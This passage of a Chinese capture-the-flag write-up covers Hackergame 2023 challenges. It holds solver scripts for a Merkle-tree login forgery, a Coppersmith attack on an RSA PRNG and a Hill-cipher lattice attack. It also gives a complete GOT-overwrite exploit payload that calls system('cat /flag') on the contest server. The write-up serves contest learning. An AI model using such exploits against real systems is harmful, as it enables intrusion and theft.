  return *(_WORD *)(a1 + 37) != '}';
}

void __usercall sub_1400014C0(_DWORD *a1@<r10>)
{
  *a1 = calc_add((unsigned int)*a1, 1i64);
}

_QWORD __usercall __spoils<rbx> calc_add@<rbx>(__int64 a1@<r14>, __int64 a2@<r13>)
{
  return a2 + a1;
}

_QWORD __usercall __spoils<r9> calc_shl@<r9>(__int64 a1@<r14>, __int64 a2@<r15>)
{
  return a1 << a2;
}

_QWORD __usercall __spoils<r9> calc_xor@<r9>(__int64 a1@<r14>, __int64 a2@<r15>)
{
  return a2 ^ a1;
}

void __usercall sub_1400014C0(_DWORD *a1@<r10>)
{
  *a1 = calc_add((unsigned int)*a1, 1i64);
}

_QWORD __usercall __spoils<r10> sub_140002150@<r10>(char *a1@<r10>, char **a2@<rbx>, int *a3@<r14>)
{
  __int64 result; // r10

  result = (__int64)(a1 + 5);
  *a2 = (char *)result;
  *a3 = 0;
  return result;
}

_QWORD __usercall sub_140001470@<r9>(unsigned int *a1@<rdx>, _QWORD *a2@<r15>)
{
  __int64 v3; // r15
  __int64 result; // r9

  v3 = (unsigned int)calc_shl(*a1, 4i64);
  result = calc_xor(0x55AA00FFi64, v3);
  *a2 = result;
  return result;
}

void __usercall sub_140002070(
        _OWORD *a1@<rax>,
        _QWORD *a2@<rcx>,
        _DWORD *a3@<rdx>,
        int a4@<r10d>,
        _QWORD *a5@<rbx>,
        unsigned int *a6@<r14>)
{
  *a1 = a4;
  *a2 = *a5;
  *a3 = *a6;
}

__int64 __usercall sub_140002110@<rax>(
        _OWORD *a@<r15>,
        int a2@<r14d>,
        unsigned __int64 a3@<r11>,
        unsigned __int64 a4@<r13>)
{
  __int64 i; // rsi
  unsigned __int128 v; // rax

  i = a2;
  v = a[i] * __PAIR128__(a4, a3);
  a[i] = v;
  return v;
}

_QWORD *__usercall sub_1400020C0@<rax>(_QWORD *a1@<r14>, _QWORD *a2@<rax>, _QWORD **a3@<r10>, int *a4@<rbx>)
{
  _QWORD *v3; // r8
  __int64 v4; // rsi

  v3 = *a3;
  v4 = *a4;
  *a1 = &(*a3)[v4];
  *a2 = v3[v4];
  return a2;
}

void __usercall sub_140001700(_QWORD *a1@<rdx>, _QWORD *a2@<r10>)
{
  *a1 = calc_xor(a2, 0x7A026655FD263677i64);
}

void __usercall sub_140001550(_QWORD *a1@<r13>, unsigned int *a2@<r14>)
{
  unsigned int v2; // r9d

  v2 = calc_shl(*a2, 2i64);
  *a1 = calc_xor(0xDEADBEEFi64, v2);
}

void __usercall sub_140002050(
        _QWORD *a1@<rcx>,
        _QWORD *a2@<rdx>,
        _DWORD *a3@<r15>,
        _QWORD *a4@<r10>,
        int *a5@<r14>,
        int a6@<r13d>)
{
  *a3 = a6;
  *a1 = *a4;
  *a2 = *a5;
}

void __usercall calc__mul(_DWORD *a1@<r14>, __int64 a2@<r15>, int a3@<r13d>)
{
  a1[a2] *= a3;
}

void __usercall sub_140002020(_QWORD *a1@<r12>, _DWORD *a2@<r10>, unsigned __int16 **a3@<rdx>, int *a4@<r15>)
{
  unsigned __int16 *a3_; // r8
  __int64 a4_; // rsi

  a4_ = *a4;
  a3_ = *a3;
  *a1 = &(*a3)[a4_];
  *a2 = a3_[a4_];
}

void __usercall sub_140001740(_WORD *a1@<rbx>, unsigned int a2@<r10d>)
{
  *a1 = calc_xor(a2, 0xCDECi64);
}

void __usercall sub_140001640(_QWORD *a1@<rdx>, unsigned int *a2@<r10>)
{
  unsigned int v2; // r9d

  v2 = calc_shl(*a2, 1i64);
  *a1 = calc_xor(33i64, v2);
}

void __usercall sub_140002000(
        _DWORD *a1@<r15>,
        _QWORD *a2@<rcx>,
        _BYTE *a3@<rdx>,
        int a4@<eax>,
        char **a5@<r10>,
        int *a6@<r11>)
{
  char *v5; // rax
  __int64 v6; // rsi

  *a1 = a4;
  v5 = *a5;
  v6 = *a6;
  *a2 = &(*a5)[v6];
  *a3 = v5[v6];
}

bool __usercall sub_1400020F0@<bl>(_BYTE *a1@<r14>, char a2@<r15b>, char a3@<r13b>, _DWORD *a4@<r12>)
{
  *a1 = a2 * a3;
  return *a4 == 3;
}

void __usercall sub_1400020A0(_DWORD *a1@<r14>, char **a2@<r10>, int *a3@<rbx>)
{
  *a1 = (unsigned __int8)(*a2)[*a3];
}

bool __usercall sub_140001780@<bl>(int *a1@<r13>, int a2@<r10d>)
{
  return a2 != HACKERGAME[*a1];
}

void __usercall sub_140001740(_WORD *a1@<rbx>, unsigned int a2@<r10d>)
{
  *a1 = calc_xor(a2, 0xCDECi64);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char i_______; // [rsp+2Bh] [rbp-1ADh] BYREF
  int j__; // [rsp+2Ch] [rbp-1ACh] BYREF
  unsigned int i_____; // [rsp+30h] [rbp-1A8h] BYREF
  unsigned int i____; // [rsp+34h] [rbp-1A4h] BYREF
  unsigned int j; // [rsp+38h] [rbp-1A0h] BYREF
  int i___; // [rsp+3Ch] [rbp-19Ch] BYREF
  unsigned int i_; // [rsp+40h] [rbp-198h] BYREF
  int j_; // [rsp+44h] [rbp-194h] BYREF
  int i; // [rsp+48h] [rbp-190h] BYREF
  int v13; // [rsp+4Ch] [rbp-18Ch]
  char content[12]; // [rsp+50h] [rbp-188h] BYREF
  unsigned int v15; // [rsp+5Ch] [rbp-17Ch] BYREF
  int v16; // [rsp+60h] [rbp-178h] BYREF
  int j___; // [rsp+64h] [rbp-174h] BYREF
  int tmp__; // [rsp+68h] [rbp-170h] BYREF
  int tmp____; // [rsp+6Ch] [rbp-16Ch] BYREF
  __int64 tmp1; // [rsp+70h] [rbp-168h] BYREF
  _QWORD *v21; // [rsp+78h] [rbp-160h] BYREF
  _QWORD *v22; // [rsp+80h] [rbp-158h] BYREF
  __int64 tmp_; // [rsp+88h] [rbp-150h] BYREF
  _WORD *v24; // [rsp+90h] [rbp-148h] BYREF
  __int64 tmp___; // [rsp+98h] [rbp-140h] BYREF
  _OWORD *content_; // [rsp+A0h] [rbp-138h] BYREF
  _DWORD *content__; // [rsp+A8h] [rbp-130h] BYREF
  __int64 j_____; // [rsp+B0h] [rbp-128h] BYREF
  _BYTE *content___; // [rsp+B8h] [rbp-120h] BYREF
  __int64 tmp1_; // [rsp+C0h] [rbp-118h] BYREF
  unsigned __int64 v31; // [rsp+C8h] [rbp-110h]
  char Buf1[48]; // [rsp+D0h] [rbp-108h] BYREF

  v13 = 0;
  puts(HACKERGAME0);
  scanf(HACKERGAME1, Buf1, 39i64);
  if ( !memcmp(Buf1, "flag{", 5ui64) && !sub_140001440(Buf1) )
  {
    sub_140002150(Buf1, (char **)content, &i);
    while ( i < 4 )
    {
      for ( j_ = 0; j_ < 2; add_1_(&j_) )
      {
        sub_140001470(&i, &tmp1);
        sub_140002070(&tmp1_, &content_, &j___, tmp1, content, (unsigned int *)&j_);
        sub_140002110(content_, j___, tmp1_, v31);
      }
      add_1(&i);
    }
    for ( i_ = 0; (int)i_ < 4; add_1__(&i_) )
    {
      sub_1400020C0(&v21, &v22, (_QWORD **)content, (int *)&i_);
      sub_140001700(v21, v22);
    }
    for ( i___ = 0; i___ < 4; add_1_______(&i___) )
    {
      for ( j = 0; (int)j < 8; add_1___(&j) )
      {
        sub_140001550(&tmp_, (unsigned int *)&i___);
        sub_140002050(&content__, &j_____, &tmp__, content, (int *)&j, tmp_);
        calc_subscript_mul(content__, j_____, tmp__);
      }
    }
    for ( i____ = 0; (int)i____ < 16; add_1____(&i____) )
    {
      sub_140002020(&v24, &v15, (unsigned __int16 **)content, (int *)&i____);
      sub_140001740(v24, v15);
    }
    for ( i_____ = 0; (int)i_____ < 4; add_1_____(&i_____) )
    {
      for ( j__ = 0; j__ < 32; add_1______(&j__) )
      {
        sub_140001640(&tmp___, &i_____);
        sub_140002000(&tmp____, &content___, &i_______, tmp___, (char **)content, &j__);
        if ( sub_1400020F0(content___, tmp____, i_______, &i_____) )
        {
          sub_1400020A0(&v16, (char **)content, &j__);
          if ( sub_140001780(&j__, v16) )
            goto LABEL_31;
        }
      }
    }
    puts(HACKERGAME2);
    return 0;
  }
  else
  {
LABEL_31:
    puts(HACKERGAME3);
    return 0;
  }
}
```

恢复的重点是参照汇编用\_\_usercall修正函数的调用约定。不过从修复结果看，这些抽出的并不是真的函数，而仅仅是中间的代码片段，所以更好的修复方法应当是patch为jmp而不是call，这样F5大概能给出完美的反编译结果。  

不过，目前的修复情况已经足够用python复现逻辑了，之后的求解也并不复杂：  
```python
def p128(n):
    return (n & ((1<<128)-1)).to_bytes(16, 'little')

def u128(s):
    assert len(s) == 16
    return int.from_bytes(s, 'little')

def p64(n):
    return (n & ((1<<64)-1)).to_bytes(8, 'little')

def u64(s):
    assert len(s) == 8
    return int.from_bytes(s, 'little')

def p32(n):
    return (n & ((1<<32)-1)).to_bytes(4, 'little')

def u32(s):
    assert len(s) == 4
    return int.from_bytes(s, 'little')

def p16(n):
    return (n & ((1<<16)-1)).to_bytes(2, 'little')

def u16(s):
    assert len(s) == 2
    return int.from_bytes(s, 'little')


def foo(s):
    assert len(s) == 32
    s = bytearray(s)

    for i in range(4):
        for j in range(2):
            tmp = (i << 4) ^ 0x55AA00FF
            v = u128(s[16*j:16*(j+1)])
            s[16*j:16*(j+1)] = p128(v * tmp)

    for i in range(4):
        tmp = u64(s[8*i:8*(i+1)])
        s[8*i:8*(i+1)] = p64(tmp ^ 0x7A026655FD263677)

    for i in range(4):
        for j in range(8):
            tmp = (i << 2) ^ 0xDEADBEEF
            v = u32(s[4*j:4*(j+1)])
            s[4*j:4*(j+1)] = p32(v * tmp)

    for i in range(16):
        tmp = u16(s[2*i:2*(i+1)])
        s[2*i:2*(i+1)] = p16(tmp ^ 0xCDEC)

    for i in range(4):
        for j in range(32):
            tmp = (i<<1)^ 33
            v = s[j]
            s[j] = (v * tmp) & 0xff

    return s


def bar(s):
    s = bytearray(s)
    assert len(s) == 32

    for i in range(3, -1, -1):
        for j in range(31, -1, -1):
            tmp = (i<<1) ^ 33
            tmp = pow(tmp, -1, 1<<8)
            v = s[j]
            s[j] = (v * tmp) & 0xff

    for i in range(15, -1, -1):
        tmp = u16(s[2*i:2*(i+1)])
        s[2*i:2*(i+1)] = p16(tmp ^ 0xCDEC)

    for i in range(3, -1, -1):
        for j in range(7, -1, -1):
            tmp = (i << 2) ^ 0xDEADBEEF
            tmp = pow(tmp, -1, 1<<32)
            v = u32(s[4*j:4*(j+1)])
            s[4*j:4*(j+1)] = p32(v * tmp)

    for i in range(3, -1, -1):
        tmp = u64(s[8*i:8*(i+1)])
        s[8*i:8*(i+1)] = p64(tmp ^ 0x7A026655FD263677)

    for i in range(3, -1, -1):
        for j in range(1, -1, -1):
            tmp = (i << 4) ^ 0x55AA00FF
            tmp = pow(tmp, -1, 1<<128)
            v = u128(s[16*j:16*(j+1)])
            s[16*j:16*(j+1)] = p128(v * tmp)

    return s


final_data = bytes.fromhex("""
9F 87 77 A2 B0 F8 D1 00  3C 4A 7C AC DA 42 27 E1
CF 2C D9 63 0A B2 A2 B4  71 77 EC 96 A9 81 2B E7
""")

flag = bar(final_data)
assert foo(flag) == final_data

print("flag{"+flag.decode()+"}")
```

## O(1) 用户登录系统

题目实现的merkle tree无法区分叶子节点与中间节点，同时sha1有长度拓展攻击和选择前缀碰撞。  

一开始纠结于三条路应该走哪一条。参与hash的字符串长度都不是很长，sha1相关的攻击很难实现，merkle tree更像本题的考点。  

如果不涉及sha1的攻击，那么最终"admin:..."的hash必定要出现在merkel tree的某个位置上。思路一度受限认为login给的树应当比import users的树矮，后来才发现反过来也是可以的。  

所以，让"admin:..."的hash作为login的树的叶子节点，然后把这个树的中间节点作为叶子节点在import users时提交。稍微爆破一下找到满足":"和utf8解码条件的输入。  

```python
from pwn import *

import string
import random
from hashlib import sha1

if 0:
    while True:
        try:
            m11 = b"admin:" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)).encode()
            h11 = sha1(m11).digest()
            h11.decode()
            break
        except UnicodeDecodeError:
            pass

    print("find:")  # "nni9unrwum"
    assert 0

m11 = b'admin:nni9unrwum'
h11 = sha1(m11).digest()
print(h11.hex())
print(h11.decode())

h12 = b"0:"+b"b"*18

assert h12 < h11
m1 = h12+h11
print(len(m1))
print(m1)

h1 = sha1(m1).digest()
print(h1.hex())

m2 = b"c:d"
h2 = sha1(m2).digest()
print(h2.hex())


# s = process("python3 o1login.py", shell=True)
s = remote("202.38.93.111", 10094)
s.sendlineafter(b"Please input your token: ", b"<>")

s.sendlineafter(b"Choice: ", b"1")
s.sendlineafter(b"> ", m1)
s.sendlineafter(b"> ", m2)
s.sendlineafter(b"> ", b"EOF")
s.sendlineafter(b"Choice: ", b"2")
s.sendlineafter(b"Login credential: ", m11+b":"+h12.hex().encode()+h2.hex().encode())
s.interactive()
```

## 链上猎手 （未完成）

没看题  

## It's MyCalculator!!!!!

checksec看到开了pie，got表可写  

GET和PUT可以选定偏移，IDA逆向发现此处按照有符号数检查，实测此处的atoi对于unsigned int的大整数可以得到负数绕过检查实现负向溢出，相当于获得了bss段上缓冲区之前相对位置的任意内存读写。  

got表可写，这些函数只有fprintf的第一个参数容易控制（stderr，恰好在bss段上溢缓冲区之前的位置），而且fprintf的触发时机可控。  

got表已填充的项经过加减可以得到libc的地址，got表未填充的项经过加减可以得到程序本身的地址（bss段包含在其中）。  
预先在bss段的空闲位置写入"cat /flag\0"字符串，然后利用程序本身的地址计算出这个写入字符串的地址，覆盖到bss段stderr的位置；再利用libc的地址计算出system函数的地址，写入fprintf的got表项的位置。最后触发fprintf(stderr, ...)的调用，实际上调用的是system("cat /flag")，即可获得flag。  
注意GET和PUT的读写以4字节为单位，8字节的地址需要分两次。  

整个过程不涉及二次读取stdin，因此没有遇到官方writeup提到的stdin tty缓冲造成getc读取失败的问题，也不需要额外的输入填充。  

生成payload的代码：  
```python
s = (""
f"PUT {(-4) & 0xffffffff} {u32(b'cat ')}\n"  # 0x55555555a0f0
f"PUT {(-3) & 0xffffffff} {u32(b'/fla')}\n"
f"PUT {(-2) & 0xffffffff} {ord('g')}\n"

f"PUT 0 GET {(-44) & 0xffffffff} + {0x55555555a100-0x5555555550d6}\n"  # result_buffer[0] = LODWORD(&result_buffer)
f"PUT 1 GET {(-43) & 0xffffffff}\n"  # result_buffer[1] = HIDWORD(&result_buffer)

# stderr = 0x55555555a0f0
f"PUT {(-8) & 0xffffffff} GET 0 - 16\n"
f"PUT {(-7) & 0xffffffff} GET 1\n"

# result_buffer[2] = &system_libc
f"PUT 2 GET {(-48) & 0xffffffff} - {0x524c0-0x4c3a0}\n"
f"PUT 3 GET {(-47) & 0xffffffff}\n"

# fprintf@got = &system_libc
f"PUT {(-44) & 0xffffffff} GET 2\n"
f"PUT {(-43) & 0xffffffff} GET 3"

"")

print(s, end="")
```

生成的payload：（注意最后一行没有回车，目的是语法错误触发对fprintf的调用）  
```
PUT 4294967292 544498019
PUT 4294967293 1634493999
PUT 4294967294 103
PUT 0 GET 4294967252 + 20522
PUT 1 GET 4294967253
PUT 4294967288 GET 0 - 16
PUT 4294967289 GET 1
PUT 2 GET 4294967248 - 24864
PUT 3 GET 4294967249
PUT 4294967252 GET 2
PUT 4294967253 GET 3
```
base64之后：  
```
UFVUIDQyOTQ5NjcyOTIgNTQ0NDk4MDE5ClBVVCA0Mjk0OTY3MjkzIDE2MzQ0OTM5OTkKUFVUIDQyOTQ5NjcyOTQgMTAzClBVVCAwIEdFVCA0Mjk0OTY3MjUyICsgMjA1MjIKUFVUIDEgR0VUIDQyOTQ5NjcyNTMKUFVUIDQyOTQ5NjcyODggR0VUIDAgLSAxNgpQVVQgNDI5NDk2NzI4OSBHRVQgMQpQVVQgMiBHRVQgNDI5NDk2NzI0OCAtIDI0ODY0ClBVVCAzIEdFVCA0Mjk0OTY3MjQ5ClBVVCA0Mjk0OTY3MjUyIEdFVCAyClBVVCA0Mjk0OTY3MjUzIEdFVCAz
```

## 小 Z 的谜题 （未完成）

本场比赛最遗憾的一道题。另外4道math做出了3.5道，却偏偏剩了这道做出人数很多的题爆零……十分难受  

虽然意识到题目的算法一定对应一个有意义的数学问题，但全程一直没看出来这是空间立方体填充，自然也就无从下手。  

也考虑过用z3，但没想明白stage3的sort应该怎么转换（赛后看writeup原来直接枚举各种情况用Or连接就行了？？而且能通过全部3关？？）  

## 黑客马拉松 （部分完成）

```
黑客马拉松 math     550 16 (17)
    教练，有人抢跑！ 300 16
    一発勝負        250 17
```

我就是那唯一一位做出第二关不会第一关的……  

取 e = phi - 1 ，则 state * pow(state, e, n) % n = pow(state, phi, n) = 1  
e很大，所以 k = 1024 - 96  
上式中state是96位的数，pow(state, e, n)是1024位的数但只有最高的96位未知，所以上面的等式相当于只有两个位数不超过96的未知量，而模数n的位数高达1024，未知量的位数远小于模数，可以用多变量coppersmith求解。  
使用了 https://github.com/defund/coppersmith/blob/master/coppersmith.sage 提供的多变量coppersmith算法实现，其模数要求必须是质数，这里只要把n分解为p、q分别求解再用中国剩余定理合并即可。  

相同的方法过不了第一关，因为无法通过代码中 `math.gcd(states[i] - state, N) == 1` 的循环检查。  
也查到了rsa prng、Micali-Schnorr prng，以及一篇论文 [On the Possibility of a Backdoor in the Micali-Schnorr Generator](https://eprint.iacr.org/2023/440 ) 和 [代码实现](https://github.com/ucsd-hacc/msdrbg_code )，但看不太明白，也没想通如何构造等式通过coppersmith求解。  

此外，题目要求的p、q两个强质数的生成也卡了不少时间。最初考虑的是先生成质数p再检查(p-1)/2的大质因子，但是根本跑不动；后来才想到直接生成质数lfp作为(p-1)/2，再检查p=lpf\*2+1是否为质数，很快就能找到两个符合要求的质数p、q。  

sage代码：
```python
# https://github.com/defund/coppersmith/blob/master/coppersmith.sage

import itertools

def small_roots(f, bounds, m=1, d=None):
        if not d:
                d = f.degree()

        if isinstance(f, Polynomial):
                x, = polygens(f.base_ring(), f.variable_name(), 1)
                f = f(x)

        R = f.base_ring()
        N = R.cardinality()

        f /= f.coefficients().pop(0)
        f = f.change_ring(ZZ)

        G = Sequence([], f.parent())
        for i in range(m+1):
                base = N^(m-i) * f^i
                for shifts in itertools.product(range(d), repeat=f.nvariables()):
                        g = base * prod(map(power, f.variables(), shifts))
                        G.append(g)

        B, monomials = G.coefficient_matrix()
        monomials = vector(monomials)

        factors = [monomial(*bounds) for monomial in monomials]
        for i, factor in enumerate(factors):
                B.rescale_col(i, factor)

        B = B.dense_matrix().LLL()

        B = B.change_ring(QQ)
        for i, factor in enumerate(factors):
                B.rescale_col(i, 1/factor)

        H = Sequence([], f.parent().change_ring(QQ))
        for h in filter(None, B*monomials):
                H.append(h)
                I = H.ideal()
                if I.dimension() == -1:
                        H.pop()
                elif I.dimension() == 0:
                        roots = []
                        for root in I.variety(ring=ZZ):
                                root = tuple(R(root[var]) for var in f.variables())
                                roots.append(root)
                        return roots

        return []


import ast
import random
import math
import sympy
from Crypto.Util.number import getPrime, getStrongPrime


def getprime_and_lf(bit_count):
    while True:
        lfp = getPrime(bit_count - 1)
        p = 2 * lfp + 1
        if sympy.isprime(p):
            assert int(p).bit_length() == bit_count, int(p).bit_length()
            return p, lfp

#p, lfp = getprime_and_lf(512)
#q, lfq = getprime_and_lf(512)
p, lfp = 10284964423277086781324646162797444948286735987210973268291637934982461017403266491517131914591936783189564830908678379292104063404374510956134416734532283, 5142482211638543390662323081398722474143367993605486634145818967491230508701633245758565957295968391594782415454339189646052031702187255478067208367266141
q, lfq = 10915896047167696332216890728349359832094851512246844563429798011757612997994676280284416871214719712172628555929494696167274705179563157213424879235977027, 5457948023583848166108445364174679916047425756123422281714899005878806498997338140142208435607359856086314277964747348083637352589781578606712439617988513

n = p * q
phi = (p-1) * (q-1)
e = phi - 1
d = pow(e, -1, phi)

Nbits = int(n).bit_length()
assert Nbits == 1024

assert int(d).bit_length() > 0.292*Nbits

k = Nbits - max(int(Nbits*2/e), 96)
assert k == 1024 - 96


from pwn import *

# s = process("python3 rsa_prng.py", shell=True)
s = remote("202.38.93.111", 20230)
s.sendlineafter(b"Please input your token: ", b"36:MEUCIQDRBrTZvTOdMDiPuXZcFiw8M7EYMjRhTNNmEEp5WczQ1QIgOFiC/wdfGxpZSfqcGRxSkQyG+6Tg9zGFKP4MiOMhaJA=")

s.sendlineafter(b"p: ", str(p).encode())
s.sendlineafter(b"q: ", str(q).encode())
s.sendlineafter(b"A large prime factor of p-1: ", str(lfp).encode())
s.sendlineafter(b"A large prime factor of q-1: ", str(lfq).encode())
s.sendlineafter(b"e: ", str(e).encode())
s.sendlineafter(b"Choose mission: ", b"2")
r = s.recvline()
print(r)

b = ast.literal_eval(r.decode())[0]

P.<x, y> = PolynomialRing(GF(p))
f = x * (y * a + b) - 1
bounds = (1<<96, 1<<96)
r = small_roots(f, bounds)
print(r)
s1_p = (r[0][1] << k) + b
print(s1_p)
print(pow(r[0][0], e, n))

P.<x, y> = PolynomialRing(GF(q))
f = x * (y * a + b) - 1
bounds = (1<<96, 1<<96)
r = small_roots(f, bounds)
print(r)
s1_q = (r[0][1] << k) + b
print(s1_q)
print(pow(r[0][0], e, n))

s1 = CRT(int(s1_p), int(s1_q), p, q)

s.sendlineafter(b"Predict PRNG state: ", str(s1).encode())
r = s.recv()
print(r)
print(r.decode())
s.interactive()
```


## 不可加密的异世界 2

第一关注意到作为异或key的flag1，每个字节的最高位永远为0，所以如果两组输入只有其中一个字节的最高位bit不同，它们分别异或flag1后仍然只有这个bit不同。而只有最高位bit不同等同于加减128，两次的等式相减即可消除异或flag1的部分，只剩下一个字节是128，其他都是0，就可以求出希尔矩阵的一个列。重复128次即可恢复完整的矩阵。  
注意源码无法区分0和256，因此如果服务器返回的值包含0，需要重新生成。实测总共400次是足够的。  

第二关列出矩阵方程即可发现只需要求解希尔矩阵减去单位矩阵后得到的矩阵的非0解。  

第三关在第二关的基础上要求解在可见字符范围内。第二关实际上可以得出通解，按照高斯消元的逻辑，通解是若干个向量的线性组合。目标是找到这些线性组合中比较接近可见字符范围的一个解，这就是格上cvp问题的原始定义。  
可见字符的范围是0x20到0x7f之间，取中值79作为cvp的目标向量，与通解线性组合向量和模数257一起构造格矩阵，用BKZ算法做格基规约（实测LLL算法难以找到符合要求的解），找到中值79只被减去一次的行，把这行加上79，即是这些向量线性组合中比较接近中值79的向量，可以作为第三关的答案。  

python代码：
```python
import ast
import string
import random
import os
from pwn import *


def xor(b1:bytes, b2:bytes):
    assert len(b1) == len(b2)
    return bytes([ i^j for i,j in zip(b1,b2)])

def pad(msg:bytes, target_len):
    return msg + "".join([random.choice(string.printable) for _ in range(target_len - len(msg))]).encode()


# s = process("sage unencryptable_world2.sage", shell=True)
s = remote("202.38.93.111", 22000)
s.sendlineafter(b"Please input your token:", b"<>")

s.recvuntil(b"[+] please give me some hex input (128 bytes) such as 77656c636f6d65 and I will check encrypt-ability for you.")


def oracle(buf):
    global s
    s.sendlineafter(b">", buf.hex().encode())
    s.recvuntil(b"[+] you ciphertext : ")
    r = s.recvline()
    r = r.strip().decode()
    assert len(r) == 256
    msg = bytes.fromhex(r[:256])
    if any(m == 0 for m in msg):
        return None
    return msg

def findvalidbuf():
    while True:
        buf = pad(b"", 128)
        msg = oracle(buf)
        if msg:
            return buf, msg


data = [None] * 128

count = 0
while count < 128:
    print("tttt", count)
    buf, msg = findvalidbuf()
    for i in range(128):
        if not data[i]:
            buf2 = bytearray(buf)
            buf2[i] ^= 0x80
            msg2 = oracle(buf2)
            if msg2:
                data[i] = (buf, msg, buf2, msg2)
                count += 1

matrix = [[None]*128 for _ in range(128)]

for i, (buf, msg, buf2, msg2) in enumerate(data):
    col = [(((msg2[j]-msg[j]) % 257) * pow(128, -1, 257)) % 257 for j in range(128)]
    for j in range(128):
        matrix[j][i] = col[j]

print(matrix)

with open("tmp_data.txt", "w") as f:
    f.write(str(matrix) + "\n")
    f.write(str(list(data[0][1])) + "\n")

os.system("sage solve_matrix.sage")

with open("tmp_solve_result.txt", "r") as f:
    lines = f.readlines()

buff = ast.literal_eval(lines[0])
t = ast.literal_eval(lines[1])

flag = xor(data[0][0], buff)
print(flag)


s.sendlineafter(b">", bytes(t).hex())
s.interactive()
```

其中方程求解和格规约部分的sage代码：  
```python
import ast

with open("tmp_data.txt", "r") as f:
    lines = f.readlines()

m_ = ast.literal_eval(lines[0])
msg_ = ast.literal_eval(lines[1])


base_mod = 2**8 + 1
base_ring = GF(base_mod)

m = matrix(base_ring, m_)
v = vector(base_ring, msg_)

r = m.solve_right(v)

r_ = list(int(c) for c in r)



a = m - matrix.identity(base_ring, 128)

print(a.rank())

# https://ask.sagemath.org/question/31009/linear-equations-with-infinite-solutions/

t = a.solve_right(vector(base_ring, [0]*128))
k = a.right_kernel()
basises = list(k.basis())
b1 = basises[0]

print(t)
print(k)

while True:
    t += b1
    t_ = list(int(c) for c in t)
    if all(c < 256 for c in t_):
        break

assert m*t == t
print(t)


basis_count = len(basises)
print(basis_count)

ttt = block_matrix(
    [
        [matrix(ZZ, basises), matrix.zero(ZZ, basis_count, 1)],
        [matrix.identity(ZZ, 128) * 257, matrix.zero(ZZ, 128, 1)],
        [matrix(ZZ, [79]*128), 1],
    ],
    subdivide=False
)

rrr = ttt.BKZ()

print(rrr)

t_ = None
for row in rrr:
    if row[-1] == -1:
        t_ = [79+row[i] for i in range(128)]
        if all(0x20 <= c < 0x7f for c in t_):
            break
        else:
            t_ = None

print(t_)
print(bytes(t_))
t = vector(base_ring, t_)
assert m*t == t


with open("tmp_solve_result.txt", "w") as f:
    f.write(str(r_) + "\n")
    f.write(str(t_) + "\n")

```

有一点很不理解，希尔之秘就是格cvp问题的直接应用，总比黑客马拉松第一关要自己构造coppersmith简单多了吧……为什么做出人数反而少了3个？？  

## 旧日之痕 （未完成）

C++ + llvm + 去符号，这种buf拉满的做法出在hackergame中，想必是防ak吧（虽然没达到目标）  

题目思路很新颖，在编译后的二进制中藏水印（IDA本体应该用了类似的技术），但逆向不是一般的痛苦（以至于赛程前期根本不想逆，后期直接摆烂更不想逆）  

不过根据libbw.so调用的llvm相关的函数也能大致猜出可能的逻辑：输入按bit拆分，做一个肯定有办法恢复的随机打乱，最后传递到sub_9313中参与llvm::BasicBlock::moveAfter函数的调用，所以隐藏secret的方法就是根据每个bit的值改变各个基本块的顺序。  

恢复的方法大概应该是先逆清楚基本块顺序的交换与输入的secret的各个bit的关系，然后逆向给出的二进制找出各个基本块和顺序，最后逆推得到secret。稍微想想就感觉复杂到头大，而且赛期内个人空闲时间有限很难找出这么长的时间攻克这道题，只好放弃（题目思路很赞，如果真的做出来收获应该蛮大的）。  

# 后记

写writeup是一件很累人的事情\^\^vv\<\>\<\>  ，但作为参赛的复盘总结还是有必要写的  

最后，欢迎在双十一参加 [0CTF](https://ctf.0ops.sjtu.cn ) （Nov 11 2023, 10:00 UTC+8）  
（平台打不开？嗯...小道消息，今年的平台运维连着打了geekgame和hackergame……）  
